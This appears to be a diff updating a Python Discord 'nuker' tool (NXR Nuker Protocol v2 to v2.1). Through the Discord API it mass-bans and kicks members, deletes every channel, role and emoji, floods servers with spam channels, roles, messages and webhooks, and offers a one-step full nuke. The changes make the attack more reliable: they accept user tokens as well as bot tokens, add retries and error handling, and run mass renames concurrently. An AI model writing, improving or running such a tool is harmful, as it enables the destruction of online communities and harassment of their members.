@@ -1,5 +1,5 @@
 # nxr_nuker_protocol.py
-# NXR NUKER PROTOCOL v2
+# NXR NUKER PROTOCOL v2.1
 # Python 3.10+ | pip install aiohttp colorama pyyaml
 
 import asyncio
@@ -9,7 +9,7 @@ import os
 import sys
 import time
 import random
-import string
+import traceback
 from pathlib import Path
 
 from colorama import init as cinit
@@ -26,9 +26,6 @@ if os.name == "nt":
 API = "https://discord.com/api/v10"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-# ---------------------------------------------------------------
-# EMBEDDED CONFIG (exe works standalone, yml overrides if present)
-# ---------------------------------------------------------------
 DEFAULT_CONFIG = {
     "reason": "NXR",
     "concurrency": 6,
@@ -60,7 +57,6 @@ DEFAULT_CONFIG = {
 
 
 def _load_yaml_overrides():
-    """if config.yml sits next to the exe/script, merge its values over defaults"""
     if yaml is None:
         return {}
     base = Path(getattr(sys, "frozen", False) and Path(sys.executable).parent or Path(__file__).parent)
@@ -70,7 +66,6 @@ def _load_yaml_overrides():
     try:
         with open(p, "r", encoding="utf-8") as f:
             loaded = yaml.safe_load(f) or {}
-        # flatten: accept both flat and {nuker: {...}, ui: {...}} shapes
         flat = {}
         for k, v in loaded.items():
             if isinstance(v, dict):
@@ -142,7 +137,7 @@ def banner():
     for line in BANNER_ART:
         print(grad(line))
     sub = "N X R   N U K E R   P R O T O C O L"
-    tag = "[ v2.0 - full protocol ]"
+    tag = "[ v2.1 - full protocol ]"
     pad = " " * max(0, (len(BANNER_ART[0]) - len(sub)) // 2)
     print()
     print(pad + grad(sub))
@@ -161,8 +156,50 @@ def log(tag, msg, color=C_ACCENT):
 
 def prompt(msg, default=None):
     d = f" {C_MUTED}({default}){RESET}" if default is not None else ""
-    val = input(f"{C_ACCENT}-> {RESET}{msg}{d}: ").strip()
+    try:
+        val = input(f"{C_ACCENT}-> {RESET}{msg}{d}: ").strip()
+    except EOFError:
+        return default
     return val if val else default
+
+
+def pause(msg="press ENTER to exit"):
+    """keep the window open — critical for double-clicked exe"""
+    try:
+        input(f"\n{C_MUTED}{msg}...{RESET}")
+    except EOFError:
+        pass
+
+
+def _normalize_token(raw):
+    """
+    Accept any of:
+      - bot token with 'Bot ' prefix    -> unchanged
+      - bot token without prefix        -> prepend 'Bot '
+      - user token (JWT, two dots)      -> unchanged
+      - Bearer prefix                   -> normalized to 'Bot '
+    """
+    t = raw.strip().strip('"').strip("'")
+    low = t.lower()
+    if low.startswith("bot "):
+        return t
+    if low.startswith("bearer "):
+        return "Bot " + t.split(" ", 1)[1]
+    # JWT user token has exactly two dots and long segments
+    if t.count(".") == 2 and len(t) > 60:
+        return t
+    return "Bot " + t
+
+
+def _extract_guild_id(raw):
+    """accept raw snowflake, or paste a channel/message URL, or '<#id>'"""
+    s = raw.strip().strip("<>#")
+    # try to find a 17-20 digit snowflake
+    import re
+    digits = re.findall(r"\d{17,20}", s)
+    if digits:
+        return digits[0]
+    return s
 
 
 # ---------------------------------------------------------------
@@ -188,11 +225,15 @@ class NXRNuker:
 
     async def _req(self, method, path, **kwargs):
         url = f"{API}{path}"
+        last_err = {"error": "unknown"}
         for _ in range(5):
             try:
                 async with self.session.request(method, url, **kwargs) as r:
                     if r.status == 429:
-                        data = await r.json()
+                        try:
+                            data = await r.json()
+                        except Exception:
+                            data = {}
                         await asyncio.sleep(float(data.get("retry_after", 2)) + 0.2)
                         continue
                     if r.status in (200, 201, 204):
@@ -200,23 +241,37 @@ class NXRNuker:
                             return await r.json()
                         except Exception:
                             return {}
-                    return {"error": r.status, "text": await r.text()}
-            except Exception:
+                    body = ""
+                    try:
+                        body = await r.text()
+                    except Exception:
+                        pass
+                    last_err = {"error": r.status, "text": body}
+                    if r.status in (401, 403, 404):
+                        return last_err
+                    await asyncio.sleep(1)
+            except Exception as e:
+                last_err = {"error": "exception", "text": f"{type(e).__name__}: {e}"}
                 await asyncio.sleep(1)
-        return {"error": "failed"}
+        return last_err
 
-    # recon ------------------------------------------------------
+    async def whoami(self):
+        return await self._req("GET", "/users/@me")
+
     async def fetch_guild(self):
         return await self._req("GET", f"/guilds/{self.guild_id}?with_counts=true")
 
     async def fetch_channels(self):
-        return await self._req("GET", f"/guilds/{self.guild_id}/channels")
+        r = await self._req("GET", f"/guilds/{self.guild_id}/channels")
+        return r if isinstance(r, list) else []
 
     async def fetch_roles(self):
-        return await self._req("GET", f"/guilds/{self.guild_id}/roles")
+        r = await self._req("GET", f"/guilds/{self.guild_id}/roles")
+        return r if isinstance(r, list) else []
 
     async def fetch_emojis(self):
-        return await self._req("GET", f"/guilds/{self.guild_id}/emojis")
+        r = await self._req("GET", f"/guilds/{self.guild_id}/emojis")
+        return r if isinstance(r, list) else []
 
     async def fetch_members(self, limit=1000):
         members, after = [], "0"
@@ -233,7 +288,6 @@ class NXRNuker:
             await asyncio.sleep(0.5)
         return members
 
-    # bans -------------------------------------------------------
     async def ban_member(self, uid, reason, dd=0):
         return await self._req(
             "PUT", f"/guilds/{self.guild_id}/bans/{uid}",
@@ -260,7 +314,6 @@ class NXRNuker:
         await asyncio.gather(*(w(m) for m in members))
         return ok, fail
 
-    # kicks ------------------------------------------------------
     async def kick_member(self, uid, reason):
         return await self._req(
             "DELETE", f"/guilds/{self.guild_id}/members/{uid}",
@@ -282,7 +335,6 @@ class NXRNuker:
         await asyncio.gather(*(w(m) for m in members))
         return ok
 
-    # channels ---------------------------------------------------
     async def delete_channel(self, cid):
         return await self._req("DELETE", f"/channels/{cid}")
 
@@ -319,7 +371,6 @@ class NXRNuker:
 
         await asyncio.gather(*(w(i) for i in range(amount)))
 
-    # roles ------------------------------------------------------
     async def delete_role(self, rid):
         return await self._req("DELETE", f"/guilds/{self.guild_id}/roles/{rid}")
 
@@ -361,7 +412,6 @@ class NXRNuker:
 
         await asyncio.gather(*(w(i) for i in range(amount)))
 
-    # messages ---------------------------------------------------
     async def send_message(self, cid, content):
         return await self._req(
             "POST", f"/channels/{cid}/messages",
@@ -384,7 +434,6 @@ class NXRNuker:
         for t in text:
             await self.spam_messages(t["id"], content, amount, delay)
 
-    # slowmode ---------------------------------------------------
     async def slowmode_channel(self, cid, seconds):
         return await self._req(
             "PATCH", f"/channels/{cid}",
@@ -407,7 +456,6 @@ class NXRNuker:
         await asyncio.gather(*(w(c) for c in channels))
         return ok
 
-    # webhooks ---------------------------------------------------
     async def create_webhook(self, cid, name="NXR"):
         return await self._req(
             "POST", f"/channels/{cid}/webhooks",
@@ -433,7 +481,6 @@ class NXRNuker:
         await asyncio.gather(*(w(i) for i in range(amount)))
         return ok
 
-    # nicknames --------------------------------------------------
     async def set_nick(self, uid, nick):
         return await self._req(
             "PATCH", f"/guilds/{self.guild_id}/members/{uid}",
@@ -443,21 +490,19 @@ class NXRNuker:
     async def mass_nick(self, members, template, conc=5):
         sem = asyncio.Semaphore(conc)
         ok = 0
-        for i, m in enumerate(members):
+
+        async def w(i, m):
+            nonlocal ok
             nick = template.replace("{n}", str(i))
+            async with sem:
+                r = await self.set_nick(m["user"]["id"], nick)
+                if "error" not in r:
+                    ok += 1
 
-            async def w(m=m, nick=nick):
-                nonlocal ok
-                async with sem:
-                    r = await self.set_nick(m["user"]["id"], nick)
-                    if "error" not in r:
-                        ok += 1
-
-            await w()
+        await asyncio.gather(*(w(i, m) for i, m in enumerate(members)))
         log("NICK", f"{ok}/{len(members)} renamed", C_OK)
         return ok
 
-    # guild edit -------------------------------------------------
     async def rename_guild(self, name):
         return await self._req(
             "PATCH", f"/guilds/{self.guild_id}",
@@ -476,24 +521,16 @@ class NXRNuker:
 W = 52
 
 
-def box_top():
-    return grad("+" + "-" * W + "+")
-
-
-def box_bot():
-    return grad("+" + "-" * W + "+")
-
-
-def box_sep():
+def box_line():
     return grad("+" + "-" * W + "+")
 
 
 def draw_menu():
     print()
-    print(box_top())
+    print(box_line())
     pad = (W - 35) // 2
     print(grad("|") + " " * pad + grad("N X R   N U K E R   P R O T O C O L") + " " * (W - 35 - pad) + grad("|"))
-    print(box_sep())
+    print(box_line())
     items = [
         ("1",  "Ban All Members"),
         ("2",  "Kick All Members"),
@@ -512,12 +549,10 @@ def draw_menu():
     ]
     for k, label in items:
         num = f"{C_ACCENT}[{k:>2}]{RESET}"
-        line = f"|  {num}  {label}"
-        # pad visible
         visible = len(f"|  [{k:>2}]  {label}")
-        line += " " * (W + 2 - visible - 1) + grad("|")
-        print(line)
-    print(box_bot())
+        pad_r = " " * max(1, (W + 2) - visible - 1)
+        print(f"|  {num}  {label}{pad_r}" + grad("|"))
+    print(box_line())
     print()
 
 
@@ -532,8 +567,11 @@ def header(txt):
 async def act_ban(n):
     header("BAN ALL MEMBERS")
     reason = prompt("reason", C("reason"))
-    dd = int(prompt("delete msg days (0-7)", str(C("ban_delete_days"))))
-    conc = int(prompt("concurrency", str(C("concurrency"))))
+    try:
+        dd = int(prompt("delete msg days (0-7)", str(C("ban_delete_days"))) or 0)
+        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
+    except ValueError:
+        dd, conc = 0, 6
     log("SCAN", "fetching members...", C_WARN)
     members = await n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
@@ -544,7 +582,10 @@ async def act_ban(n):
 async def act_kick(n):
     header("KICK ALL MEMBERS")
     reason = prompt("reason", C("reason"))
-    conc = int(prompt("concurrency", str(C("concurrency"))))
+    try:
+        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
+    except ValueError:
+        conc = 6
     members = await n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
     ok = await n.kick_all(members, reason, conc)
@@ -553,7 +594,10 @@ async def act_kick(n):
 
 async def act_del_chans(n):
     header("DELETE ALL CHANNELS")
-    conc = int(prompt("concurrency", str(C("concurrency"))))
+    try:
+        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
+    except ValueError:
+        conc = 6
     chans = await n.fetch_channels()
     log("SCAN", f"{len(chans)} channels", C_WARN)
     ok = await n.delete_all_channels(chans, conc)
@@ -563,16 +607,22 @@ async def act_del_chans(n):
 async def act_spam_chans(n):
     header("SPAM CHANNELS")
     name = prompt("channel name", C("spam_channel_name"))
-    amt = int(prompt("amount", str(C("spam_channel_amount"))))
-    ctype = int(prompt("type 0=text 2=voice", str(C("spam_channel_type"))))
-    conc = int(prompt("concurrency", str(C("spam_channel_concurrency"))))
+    try:
+        amt = int(prompt("amount", str(C("spam_channel_amount"))) or 50)
+        ctype = int(prompt("type 0=text 2=voice", str(C("spam_channel_type"))) or 0)
+        conc = int(prompt("concurrency", str(C("spam_channel_concurrency"))) or 3)
+    except ValueError:
+        amt, ctype, conc = 50, 0, 3
     await n.spam_channels(name, amt, ctype, conc)
     log("DONE", "channel spam complete", C_OK)
 
 
 async def act_del_roles(n):
     header("DELETE ALL ROLES")
-    conc = int(prompt("concurrency", str(C("concurrency"))))
+    try:
+        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
+    except ValueError:
+        conc = 6
     roles = await n.fetch_roles()
     ok = await n.delete_all_roles(roles, conc)
     log("DONE", f"deleted {ok} roles", C_OK)
@@ -581,8 +631,11 @@ async def act_del_roles(n):
 async def act_spam_roles(n):
     header("SPAM ROLES")
     name = prompt("role name", C("spam_role_name"))
-    amt = int(prompt("amount", str(C("spam_role_amount"))))
-    col = int(prompt("color int (0 = none)", str(C("spam_role_color"))))
+    try:
+        amt = int(prompt("amount", str(C("spam_role_amount"))) or 50)
+        col = int(prompt("color int (0 = none)", str(C("spam_role_color"))) or 0)
+    except ValueError:
+        amt, col = 50, 0
     await n.spam_roles(name, amt, col)
     log("DONE", "role spam complete", C_OK)
 
@@ -594,8 +647,11 @@ async def act_spam_msgs(n):
     print(f"  {C_MUTED}text channels: {len(text)}{RESET}")
     cid = prompt("channel id (or 'all')", "all")
     content = prompt("message", C("spam_message_content"))
-    amt = int(prompt("messages per channel", str(C("spam_message_amount"))))
-    delay = float(prompt("delay (s)", str(C("spam_message_delay"))))
+    try:
+        amt = int(prompt("messages per channel", str(C("spam_message_amount"))) or 10)
+        delay = float(prompt("delay (s)", str(C("spam_message_delay"))) or 0)
+    except ValueError:
+        amt, delay = 10, 0.0
     if cid == "all":
         await n.spam_all_channels(chans, content, amt, delay)
     else:
@@ -613,8 +669,8 @@ async def act_rename(n):
 async def act_del_emojis(n):
     header("DELETE ALL EMOJIS")
     emojis = await n.fetch_emojis()
-    if isinstance(emojis, list):
-        log("SCAN", f"{len(emojis)} emojis", C_WARN)
+    log("SCAN", f"{len(emojis)} emojis", C_WARN)
+    if emojis:
         await n.delete_emojis(emojis)
     log("DONE", "emojis cleared", C_OK)
 
@@ -622,7 +678,10 @@ async def act_del_emojis(n):
 async def act_nick(n):
     header("MASS NICKNAME CHANGE")
     tmpl = prompt("nick template ({n} = index)", C("nick_template"))
-    conc = int(prompt("concurrency", "5"))
+    try:
+        conc = int(prompt("concurrency", "5") or 5)
+    except ValueError:
+        conc = 5
     members = await n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
     await n.mass_nick(members, tmpl, conc)
@@ -630,8 +689,11 @@ async def act_nick(n):
 
 async def act_slowmode(n):
     header("SLOWMODE ALL CHANNELS")
-    sec = int(prompt("slowmode seconds", str(C("slowmode_seconds"))))
-    conc = int(prompt("concurrency", "5"))
+    try:
+        sec = int(prompt("slowmode seconds", str(C("slowmode_seconds"))) or 21600)
+        conc = int(prompt("concurrency", "5") or 5)
+    except ValueError:
+        sec, conc = 21600, 5
     chans = await n.fetch_channels()
     ok = await n.slowmode_all(chans, sec, conc)
     log("DONE", f"{ok} channels set to {sec}s", C_OK)
@@ -639,8 +701,11 @@ async def act_slowmode(n):
 
 async def act_webhooks(n):
     header("SPAM WEBHOOKS")
-    amt = int(prompt("amount", str(C("spam_webhook_amount"))))
-    conc = int(prompt("concurrency", "3"))
+    try:
+        amt = int(prompt("amount", str(C("spam_webhook_amount"))) or 10)
+        conc = int(prompt("concurrency", "3") or 3)
+    except ValueError:
+        amt, conc = 10, 3
     chans = await n.fetch_channels()
     ok = await n.spam_webhooks(chans, amt, conc)
     log("DONE", f"created {ok} webhooks", C_OK)
@@ -649,7 +714,10 @@ async def act_webhooks(n):
 async def act_full_nuke(n):
     header("FULL NUKE")
     reason = prompt("ban reason", C("reason"))
-    conc = int(prompt("concurrency", str(C("concurrency"))))
+    try:
+        conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
+    except ValueError:
+        conc = 6
     log("NUKE", "recon...", C_ERR)
     members, chans, roles = await asyncio.gather(
         n.fetch_members(C("fetch_member_limit")),
@@ -692,7 +760,7 @@ async def menu(n):
         draw_menu()
         c = prompt("select", "0")
         if c == "0":
-            print(f"\n{C_MUTED}exiting.{RESET}\n")
+            print(f"\n{C_MUTED}exiting.{RESET}")
             return
         fn = ACTIONS.get(c)
         if not fn:
@@ -702,29 +770,71 @@ async def menu(n):
             await fn(n)
         except Exception as e:
             log("ERR", f"{type(e).__name__}: {e}", C_ERR)
+            traceback.print_exc()
 
 
-async def main():
+async def run():
     clear()
     banner()
 
-    token = prompt("bot token")
-    gid = prompt("guild id")
-    if not token or not gid:
+    token_raw = prompt("bot token")
+    gid_raw = prompt("guild id")
+
+    if not token_raw or not gid_raw:
         log("ERR", "token and guild id required", C_ERR)
         return
 
-    async with NXRNuker(token, gid) as n:
-        info = await n.fetch_guild()
-        if "error" in info:
-            log("ERR", f"guild fetch failed: {info}", C_ERR)
-            return
-        log("OK", f"{info['name']}  |  {info.get('approximate_member_count','?')} members", C_OK)
-        await menu(n)
+    token = _normalize_token(token_raw)
+    gid = _extract_guild_id(gid_raw)
+
+    log("AUTH", "checking token...", C_WARN)
+
+    try:
+        async with NXRNuker(token, gid) as n:
+            me = await n.whoami()
+            if "error" in me:
+                code = me.get("error")
+                if code == 401:
+                    log("ERR", "invalid token (401) — check the bot token", C_ERR)
+                else:
+                    log("ERR", f"auth failed: {code} {me.get('text','')[:120]}", C_ERR)
+                return
+
+            log("OK", f"logged in as {me.get('username','?')}#{me.get('discriminator','0')} (id {me.get('id','?')})", C_OK)
+
+            info = await n.fetch_guild()
+            if "error" in info:
+                code = info.get("error")
+                if code == 404:
+                    log("ERR", f"guild {gid} not found — bot is not in it or wrong id", C_ERR)
+                elif code == 403:
+                    log("ERR", f"no access to guild {gid} (403) — invite the bot first", C_ERR)
+                else:
+                    log("ERR", f"guild fetch failed: {code} {info.get('text','')[:120]}", C_ERR)
+                return
+
+            log("OK", f"{info['name']}  |  {info.get('approximate_member_count','?')} members", C_OK)
+            await menu(n)
+
+    except aiohttp.ClientConnectorError:
+        log("ERR", "network error — check your internet / dns", C_ERR)
+    except asyncio.TimeoutError:
+        log("ERR", "request timed out", C_ERR)
+    except Exception as e:
+        log("ERR", f"{type(e).__name__}: {e}", C_ERR)
+        traceback.print_exc()
+
+
+def main():
+    try:
+        asyncio.run(run())
+    except KeyboardInterrupt:
+        print(f"\n{C_ERR}aborted.{RESET}")
+    except Exception:
+        traceback.print_exc()
+    finally:
+        pause()
 
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print(f"\n{C_ERR}aborted.{RESET}")
+    main()
